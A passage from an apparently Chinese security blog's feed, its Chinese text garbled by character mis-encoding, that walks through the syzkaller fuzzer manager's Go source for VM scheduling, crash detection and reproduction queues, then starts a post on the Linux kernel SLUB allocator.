ä¸­æ‰§è¡Œç¨‹åºï¼Œè¿™é‡Œå°±ä¸å±•å¼€äº†ï¼š</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">context.test<span class="hljs-constructor">Prog()</span><br>context.test<span class="hljs-constructor">Progs()</span><br>context.test<span class="hljs-constructor">WithInstance()</span><br>ExecProgInstance.<span class="hljs-constructor">RunSyzProg()</span><br>ExecProgInstance.<span class="hljs-constructor">RunSyzProgFile()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ExecProgInstance</span>.</span></span>run<span class="hljs-constructor">Command()</span><br></code></pre></td></tr></table></figure><h4 id="â‘¡-å¾ªç¯å¯åŠ¨åç¨‹è¿›è¡Œ-fuzzing"><a href="#â‘¡-å¾ªç¯å¯åŠ¨åç¨‹è¿›è¡Œ-fuzzing" class="headerlink" title="â‘¡ å¾ªç¯å¯åŠ¨åç¨‹è¿›è¡Œ fuzzing"></a>â‘¡ å¾ªç¯å¯åŠ¨åç¨‹è¿›è¡Œ fuzzing</h4><p>æ­¤æ—¶å·²ç»ä¸æ»¡è¶³å¯ä»¥è¿›è¡Œ crash å¤ç°çš„æ¡ä»¶äº†ï¼Œå› è€Œä¼šæœ‰ç¬¬äºŒä¸ªå°å¾ªç¯å¯åŠ¨æ–°åç¨‹<strong>å°†èµ„æºæ± ä¸­å‰©ä½™ VM è°ƒåº¦å» fuzzing</strong>ï¼Œ å¹¶å°†ç»“æœè¾“å‡ºåˆ° <code>runDone</code> ä¸­ï¼š </p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">for</span> !canRepro() &#123;<br>idx := instances.TakeOne()<br><span class="hljs-keyword">if</span> idx == <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">break</span><br>&#125;<br>log.Logf(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;loop: starting instance %v&quot;</span>, *idx)<br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>crash, err := mgr.runInstance(*idx)<br>runDone &lt;- &amp;RunResult&#123;*idx, crash, err&#125;<br>&#125;()<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>runInstance()</code> å‡½æ•°å®é™…ä¸Šä¼šè°ƒç”¨ <code>runInstanceInner()</code>ï¼Œè¯¥å‡½æ•°<strong>ä»…å½“äº§ç”Ÿäº† Crash æ—¶è¿”å›çš„ç»“æœæ‰ä¸ä¸º nilï¼Œå³ runRepro é˜Ÿåˆ—å®é™…ä¸Šä¸º Crash é˜Ÿåˆ—ï¼š</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(mgr *Manager)</span></span> runInstance(index <span class="hljs-type">int</span>) (*Crash, <span class="hljs-type">error</span>) &#123;<br>mgr.checkUsedFiles()<br>instanceName := fmt.Sprintf(<span class="hljs-string">&quot;vm-%d&quot;</span>, index)<br><br>rep, vmInfo, err := mgr.runInstanceInner(index, instanceName)<br><br>machineInfo := mgr.serv.shutdownInstance(instanceName)<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(vmInfo) != <span class="hljs-number">0</span> &#123;<br>machineInfo = <span class="hljs-built_in">append</span>(<span class="hljs-built_in">append</span>(vmInfo, <span class="hljs-string">&#x27;\n&#x27;</span>), machineInfo...)<br>&#125;<br><br><span class="hljs-comment">// Error that is not a VM crash.</span><br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br><span class="hljs-comment">// No crash.</span><br><span class="hljs-keyword">if</span> rep == <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, <span class="hljs-literal">nil</span><br>&#125;<br>crash := &amp;Crash&#123;<br>vmIndex:     index,<br>hub:         <span class="hljs-literal">false</span>,<br>Report:      rep,<br>machineInfo: machineInfo,<br>&#125;<br><span class="hljs-keyword">return</span> crash, <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><p><code>runInstanceInner()</code> çš„æ ¸å¿ƒéƒ¨åˆ†ä¸»è¦æ˜¯ï¼š</p><ul><li><p>è°ƒç”¨ <code>vmPool.Create()</code> åˆ›å»º VMï¼Œè°ƒç”¨ <code>inst.Forward()</code> è¿›è¡Œ TCP è½¬å‘ï¼Œæ‹·è´ <code>syz-fuzzer</code> ä¸ <code>syz-executor</code> åˆ° VM æ–‡ä»¶ç³»ç»Ÿä¸­</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(mgr *Manager)</span></span> runInstanceInner(index <span class="hljs-type">int</span>, instanceName <span class="hljs-type">string</span>) (*report.Report, []<span class="hljs-type">byte</span>, <span class="hljs-type">error</span>) &#123;<br>inst, err := mgr.vmPool.Create(index)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;failed to create instance: %v&quot;</span>, err)<br>&#125;<br><span class="hljs-keyword">defer</span> inst.Close()<br><br>fwdAddr, err := inst.Forward(mgr.serv.port)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;failed to setup port forwarding: %v&quot;</span>, err)<br>&#125;<br><br>fuzzerBin, err := inst.Copy(mgr.cfg.FuzzerBin)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;failed to copy binary: %v&quot;</span>, err)<br>&#125;<br><br><span class="hljs-comment">// è‹¥æä¾›äº† ExecutorBin , è¿™æ„å‘³ç€ syz-executor æ—©å·²åœ¨é•œåƒä¸­,</span><br><span class="hljs-comment">// æ•…æ— éœ€è¿›è¡Œæ‹·è´.</span><br>executorBin := mgr.sysTarget.ExecutorBin<br><span class="hljs-keyword">if</span> executorBin == <span class="hljs-string">&quot;&quot;</span> &#123;<br>executorBin, err = inst.Copy(mgr.cfg.ExecutorBin)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;failed to copy binary: %v&quot;</span>, err)<br>&#125;<br>&#125;<br><br>fuzzerV := <span class="hljs-number">0</span><br>procs := mgr.cfg.Procs<br><span class="hljs-keyword">if</span> *flagDebug &#123;<br>fuzzerV = <span class="hljs-number">100</span><br>procs = <span class="hljs-number">1</span><br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>è°ƒç”¨ <code>instance.FuzzerCmd()</code> ç”Ÿæˆå‘½ä»¤è¡Œåè°ƒç”¨ <code>inst.Run()</code> å¯åŠ¨ <code>syz-fuzzer</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// Run the fuzzer binary.</span><br>start := time.Now()<br>atomic.AddUint32(&amp;mgr.numFuzzing, <span class="hljs-number">1</span>)<br><span class="hljs-keyword">defer</span> atomic.AddUint32(&amp;mgr.numFuzzing, ^<span class="hljs-type">uint32</span>(<span class="hljs-number">0</span>))<br>  <br>args := &amp;instance.FuzzerCmdArgs&#123;<br>Fuzzer:    fuzzerBin,<br>Executor:  executorBin,<br>Name:      instanceName,<br>OS:        mgr.cfg.TargetOS,<br>Arch:      mgr.cfg.TargetArch,<br>FwdAddr:   fwdAddr,<br>Sandbox:   mgr.cfg.Sandbox,<br>Procs:     procs,<br>Verbosity: fuzzerV,<br>Cover:     mgr.cfg.Cover,<br>Debug:     *flagDebug,<br>Test:      <span class="hljs-literal">false</span>,<br>Runtest:   <span class="hljs-literal">false</span>,<br>Optional: &amp;instance.OptionalFuzzerArgs&#123;<br>Slowdown:   mgr.cfg.Timeouts.Slowdown,<br>RawCover:   mgr.cfg.RawCover,<br>SandboxArg: mgr.cfg.SandboxArg,<br>&#125;,<br>&#125;<br>cmd := instance.FuzzerCmd(args)<br>outc, errc, err := inst.Run(mgr.cfg.Timeouts.VMRunningTime, mgr.vmStop, cmd)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;failed to run fuzzer: %v&quot;</span>, err)<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>è°ƒç”¨ <code>inst.MonitorExecution()</code> ç›‘æ§ VM è¿è¡Œï¼Œè¯¥å‡½æ•°ä¸»è¦æ˜¯<strong>é€šè¿‡è·å– kernel oops æ¥åˆ¤æ–­æ˜¯å¦è§¦å‘äº† crash</strong>ï¼ˆKASAN ä¸ä¼šé€ æˆ kernel panicï¼Œä»è€Œä½¿å¾—ä¸€ä¸ª VM å®ä¾‹é•¿æœŸè¿è¡Œï¼Œä¸è¿‡ dmesg ä¸­ä»æœ‰ oopsï¼‰</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> vmInfo []<span class="hljs-type">byte</span><br>rep := inst.MonitorExecution(outc, errc, mgr.reporter, vm.ExitTimeout)<br><span class="hljs-keyword">if</span> rep == <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-comment">// This is the only &quot;OK&quot; outcome.</span><br>log.Logf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;%s: running for %v, restarting&quot;</span>, instanceName, time.Since(start))<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>vmInfo, err = inst.Info()<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>vmInfo = []<span class="hljs-type">byte</span>(fmt.Sprintf(<span class="hljs-string">&quot;error getting VM info: %v\n&quot;</span>, err))<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">return</span> rep, vmInfo, <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h3 id="Step-3-ç­‰å¾…å¤„ç†ä¸åŒ-channel-æ•°æ®"><a href="#Step-3-ç­‰å¾…å¤„ç†ä¸åŒ-channel-æ•°æ®" class="headerlink" title="Step 3. ç­‰å¾…å¤„ç†ä¸åŒ channel æ•°æ®"></a>Step 3. ç­‰å¾…å¤„ç†ä¸åŒ channel æ•°æ®</h3><p><code>vmLoop()</code> çš„æœ€åä¸»è¦å°±æ˜¯ä¸€ä¸ªå¤§çš„ <code>select</code>ï¼Œç­‰å¾…æŸä¸ª channel ä¸­æœ‰æ•°æ®åè¿›è¡Œå¤„ç†ï¼Œä¹‹åé‡æ–°è·³å›ç­‰å¾…å¤„ç†æˆ–æ˜¯å¼€å§‹ä¸‹ä¸€è½®å¾ªç¯ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> stopRequest <span class="hljs-keyword">chan</span> <span class="hljs-type">bool</span><br><span class="hljs-keyword">if</span> !stopPending &amp;&amp; canRepro() &#123;<br>stopRequest = mgr.vmStop<br>&#125;<br><br>wait:<br><span class="hljs-keyword">select</span> &#123;<br></code></pre></td></tr></table></figure><p>é¦–å…ˆæ˜¯èµ„æºæ± çš„ <code>Freed</code> channelï¼Œåœ¨ <code>Put()</code> ä¸­ä¼šå°†ç©ºé—² VM idx æ”¾å›èµ„æºæ± åå‘è¯¥ channel é€å…¥ä¸€ä¸ª <code>true</code>ï¼Œè€Œè¿™é‡Œä»€ä¹ˆéƒ½æ²¡æœ‰åšï¼Œç¬”è€…ä¼°è®¡ä¼šåœ¨åç»­ç‰ˆæœ¬ä¸­æ›´æ–°ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">case</span> &lt;-instances.Freed:<br><span class="hljs-comment">// An instance has been released.</span><br></code></pre></td></tr></table></figure><p><code>stopRequest</code> å…¶å®æ˜¯ <code>Manager.vmStop</code> ï¼Œè¿™ä¸ª channel ä¼šåœ¨ VM instance æ‰€å®ç°çš„ <code>Run()</code> æ–¹æ³•ä¸­è¢«ä½¿ç”¨ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">case</span> stopRequest &lt;- <span class="hljs-literal">true</span>:<br>log.Logf(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;loop: issued stop request&quot;</span>)<br>stopPending = <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><p>å½“ <code>runDone</code> ä¸­æœ‰æ•°æ®æ—¶è¯´æ˜<strong>fuzz äº§ç”Ÿäº† crash</strong>ï¼Œæ­¤æ—¶ä¼šå°†äº§ç”Ÿ crash çš„ VM é‡Šæ”¾å›èµ„æºæ± ï¼Œå°† crash å†™å…¥ <code>pendingRepro</code> è¡¨ä¸­ç­‰å¾…ä¸‹ä¸€è½®å¾ªç¯è¿›è¡Œå¤„ç†ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">case</span> res := &lt;-runDone:<br>log.Logf(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;loop: instance %v finished, crash=%v&quot;</span>, res.idx, res.crash != <span class="hljs-literal">nil</span>)<br><span class="hljs-keyword">if</span> res.err != <span class="hljs-literal">nil</span> &amp;&amp; shutdown != <span class="hljs-literal">nil</span> &#123;<br>log.Logf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;%v&quot;</span>, res.err)<br>&#125;<br>stopPending = <span class="hljs-literal">false</span><br>instances.Put(res.idx)<br><span class="hljs-comment">// On shutdown qemu crashes with &quot;qemu: terminating on signal 2&quot;,</span><br><span class="hljs-comment">// which we detect as &quot;lost connection&quot;. Don&#x27;t save that as crash.</span><br><span class="hljs-keyword">if</span> shutdown != <span class="hljs-literal">nil</span> &amp;&amp; res.crash != <span class="hljs-literal">nil</span> &#123;<br>needRepro := mgr.saveCrash(res.crash)<br><span class="hljs-keyword">if</span> needRepro &#123;<br>log.Logf(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;loop: add pending repro for &#x27;%v&#x27;&quot;</span>, res.crash.Title)<br>pendingRepro[res.crash] = <span class="hljs-literal">true</span><br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>reproDone</code> ä¸­ä¸º crash çš„å¤ç°ç»“æœï¼Œè¿™é‡Œä¼šä¿å­˜å¤ç°ç»“æœå¹¶å°†å¯¹åº”çš„ crash ä» <code>reproducing</code> è¡¨ä¸­åˆ é™¤</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">case</span> res := &lt;-reproDone:<br>atomic.AddUint32(&amp;mgr.numReproducing, ^<span class="hljs-type">uint32</span>(<span class="hljs-number">0</span>))<br>crepro := <span class="hljs-literal">false</span><br>title := <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">if</span> res.repro != <span class="hljs-literal">nil</span> &#123;<br>crepro = res.repro.CRepro<br>title = res.repro.Report.Title<br>&#125;<br>log.Logf(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;loop: repro on %+v finished &#x27;%v&#x27;, repro=%v crepro=%v desc=&#x27;%v&#x27;&quot;</span>,<br>res.instances, res.report0.Title, res.repro != <span class="hljs-literal">nil</span>, crepro, title)<br><span class="hljs-keyword">if</span> res.err != <span class="hljs-literal">nil</span> &#123;<br>log.Logf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;repro failed: %v&quot;</span>, res.err)<br>&#125;<br><span class="hljs-built_in">delete</span>(reproducing, res.report0.Title)<br><span class="hljs-keyword">if</span> res.repro == <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">if</span> !res.hub &#123;<br>mgr.saveFailedRepro(res.report0, res.stats)<br>&#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>mgr.saveRepro(res)<br>&#125;<br></code></pre></td></tr></table></figure><p><code>shutdown</code> ä¸­æœ‰æ•°æ®åˆ™è¡¨ç¤ºæ”¶åˆ°äº†ç»ˆæ­¢ä¿¡å·ï¼Œæ­¤æ—¶ä¼šå°† <code>shutdown</code> ç½®ä¸º nilï¼Œç»ˆæ­¢å¾ªç¯ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">case</span> &lt;-shutdown:<br>log.Logf(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;loop: shutting down...&quot;</span>)<br>shutdown = <span class="hljs-literal">nil</span><br></code></pre></td></tr></table></figure><p><code>hubReproQueue</code> ä¸Šä¹Ÿå¯èƒ½ä¼ æ¥ crashï¼Œæ­¤å¤„å°†å…¶é€å…¥ <code>pendingRepro</code> è¡¨ä¸­ç­‰å¾…åœ¨åç»­å¾ªç¯ä¸­å¤ç°ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">case</span> crash := &lt;-mgr.hubReproQueue:<br>log.Logf(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;loop: get repro from hub&quot;</span>)<br>pendingRepro[crash] = <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><p><code>needMoreRepros</code> æ˜¯ä¸€ä¸ªä¼ è¾“ channel çš„ channelï¼Œè¿™é‡Œä¼šå°†ä¸€ä¸ªæ¡ä»¶åˆ¤æ–­ç»“æœä¼ å…¥ä¼ æ¥çš„ channel ä¸­å¹¶é‡æ–°è·³å›ç­‰å¾…ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">case</span> reply := &lt;-mgr.needMoreRepros:<br>reply &lt;- phase &gt;= phaseTriagedHub &amp;&amp;<br><span class="hljs-built_in">len</span>(reproQueue)+<span class="hljs-built_in">len</span>(pendingRepro)+<span class="hljs-built_in">len</span>(reproducing) == <span class="hljs-number">0</span><br><span class="hljs-keyword">goto</span> wait<br></code></pre></td></tr></table></figure><p>æœ€åæ˜¯ <code>reproRequest</code>ï¼Œè¯¥ channel æ„ä¸º<strong>ä¸»åŠ¨è¿›è¡Œå¤ç°çš„è¯·æ±‚</strong>ï¼Œè¿™é‡Œä¼šæ‹·è´ <code>reproducing</code> ä½å›¾åå°†å…¶ä¼ å…¥ä¼ æ¥çš„ channel ä¸­ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">case</span> reply := &lt;-mgr.reproRequest:<br>repros := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">bool</span>)<br><span class="hljs-keyword">for</span> title := <span class="hljs-keyword">range</span> reproducing &#123;<br>repros[title] = <span class="hljs-literal">true</span><br>&#125;<br>reply &lt;- repros<br><span class="hljs-keyword">goto</span> wait<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è‡³æ­¤ï¼Œ<code>syz-manager</code> çš„åŸºæœ¬è¿è¡Œé€»è¾‘åˆ†æå®Œæ¯•</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;å®å°±æ˜¯ğŸ‘´ã® Manager ğŸ&lt;/p&gt;</summary>
    
    
    
    <category term="FUZZ" scheme="http://blog.arttnba3.cn/categories/FUZZ/"/>
    
    
    <category term="æ¼æ´æŒ–æ˜" scheme="http://blog.arttnba3.cn/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
    <category term="FUZZ" scheme="http://blog.arttnba3.cn/tags/FUZZ/"/>
    
    <category term="syzkaller" scheme="http://blog.arttnba3.cn/tags/syzkaller/"/>
    
  </entry>
  
  <entry>
    <title>ã€OS.0x04ã€‘Linux Kernel å†…å­˜ç®¡ç†æµ…æ III - Slub Allocator</title>
    <link href="http://blog.arttnba3.cn/2023/02/24/OS-0X04-LINUX-KERNEL-MEMORY-6.2-PART-III/"/>
    <id>http://blog.arttnba3.cn/2023/02/24/OS-0X04-LINUX-KERNEL-MEMORY-6.2-PART-III/</id>
    <published>2023-02-23T18:24:42.000Z</published>
    <updated>2023-04-23T17:58:23.750Z</updated>
    
    <content type="html"><![CDATA[<p>åˆ«äººé—®ä½ å“ªé‡Œä¸‘æ€ä½ å†æŠŠä»–åæ‰‹æŒ‚åˆ°è‡ªå·±çš„å° slub é‡Œå¯»æ±‚è®¤åŒ</p><span id="more"></span><h1 id="0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰"><a href="#0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰" class="headerlink" title="0x00.ä¸€åˆ‡å¼€å§‹ä¹‹å‰"></a>0x00.ä¸€åˆ‡å¼€å§‹ä¹‹å‰</h1><blockquote><p>å› ä¸ºè¿™ç³»åˆ—æ–‡ç« ğŸ•ŠğŸ•ŠğŸ•Šå¤ªä¹…äº†ï¼Œå†…æ ¸çš„å†…å­˜ç®¡ç†ä¹Ÿå‘ç”Ÿäº†ä¸€å®šçš„å˜åŒ–ï¼Œæ‰€ä»¥æœ¬æ–‡ç›´æ¥ç”¨æœ€æ–°çš„ 6.2 ç‰ˆæœ¬çš„å†…æ ¸æºç ï¼šï¼‰</p></blockquote><p>åœ¨<a href="https://arttnba3.cn/2022/06/30/OS-0X03-LINUX-KERNEL-MEMORY-5.11-PART-II/">ä¸Šä¸€ç¯‡æ–‡ç« </a> ä¸­ç¬”è€…ç®€è¦ä»‹ç»äº† buddy system çš„åŸºæœ¬æµç¨‹ï¼Œä½†å…¶ä¸ºä¸€ä¸ªã€Œé¡µã€è¿™ä¸€çº§çš„ allocatorï¼Œåœ¨æ—¥å¸¸ç”Ÿæ´»ä¸­ä½¿ç”¨ï¼ˆï¼Ÿï¼‰éš¾å…æœ‰äº›æµªè´¹ï¼Œå› ä¸ºå†…æ ¸ä¸­éœ€è¦åŠ¨æ€å†…å­˜åˆ†é…çš„åœºæ™¯è™½ç„¶å¾ˆå¤šï¼Œä½†æ˜¯æˆ‘ä»¬<strong>é€šå¸¸å¹¶ä¸éœ€è¦ä½¿ç”¨ä¸€æ•´é¡µèµ·æ­¥çš„å†…å­˜ï¼Œè€Œå¾€å¾€æ˜¯éœ€è¦åˆ†é…ä¸€äº›æ¯”è¾ƒå°çš„å¯¹è±¡</strong>â€”â€”å› æ­¤ slab allocator åº”è¿è€Œç”Ÿï¼Œå…¶ä»£æ›¿æˆ‘ä»¬å‘ buddy system è¯·æ±‚å†…å­˜é¡µï¼Œå¹¶åˆ†å‰²ä¸ºå¤šä¸ªå°çš„ objectï¼Œå½“æˆ‘ä»¬æ¯æ¬¡éœ€è¦æ—¶åªéœ€è¦å–ä¸€ä¸ª object å³å¯</p><blockquote><p>slab åˆè¢«ç§°ä¸ºå†…æ ¸çš„å †ï¼ˆheapï¼‰å†…å­˜ç®¡ç†ï¼Œå› ä¸ºå…¶ä¸ç”¨æˆ·æ€çš„å†…å­˜â€œå †â€ï¼ˆheapï¼‰ç±»ä¼¼ï¼Œéƒ½æ˜¯åŠ¨æ€åˆ†é…çš„å†…å­˜</p></blockquote><p>slab allocator ä¸€å…±æœ‰ä¸‰ç§ç‰ˆæœ¬ï¼š</p><ul><li>slabï¼ˆæœ€åˆçš„ç‰ˆæœ¬ï¼Œæœºåˆ¶æ¯”è¾ƒå¤æ‚ï¼Œæ•ˆç‡ä¸é«˜ï¼‰</li><li>slobï¼ˆç”¨äºåµŒå…¥å¼ç­‰åœºæ™¯çš„æä¸ºç®€åŒ–ç‰ˆæœ¬ï¼‰</li><li><strong>slub</strong>ï¼ˆä¼˜åŒ–åçš„ç‰ˆæœ¬ï¼Œ<strong>ç°åœ¨çš„é€šç”¨ç‰ˆæœ¬</strong>ï¼‰</li></ul><blockquote><p>è¿™ä¸‰ç§å†…å­˜åˆ†é…å™¨çš„é¡¶å±‚ API æ˜¯ä¸€è‡´çš„ï¼Œä½†å†…éƒ¨å®ç°æ˜¯ä¸ä¸€è‡´çš„ï¼ˆä¾‹å¦‚ slab å’Œ slub å„è‡ªæœ‰ä¸€ä¸ªå¯¹ <code>kmem_cache</code> çš„ä¸åŒå®šä¹‰ï¼‰</p></blockquote><p>æœ¬ç¯‡æ–‡ç« ä¸­æˆ‘ä»¬ä¸»è¦ä»‹ç»çš„æ˜¯ <strong>slub</strong> ï¼Œä¹Ÿæ˜¯ç°åœ¨å†…æ ¸ä¸­æœ€ä¸ºé€šç”¨çš„å°å¯¹è±¡åˆ†é…å™¨</p><h1 id="0x01-slub-allocator-çš„åŸºæœ¬ç»“æ„"><a href="#0x01-slub-allocator-çš„åŸºæœ¬ç»“æ„" class="headerlink" title="0x01. slub allocator çš„åŸºæœ¬ç»“æ„"></a>0x01. slub allocator 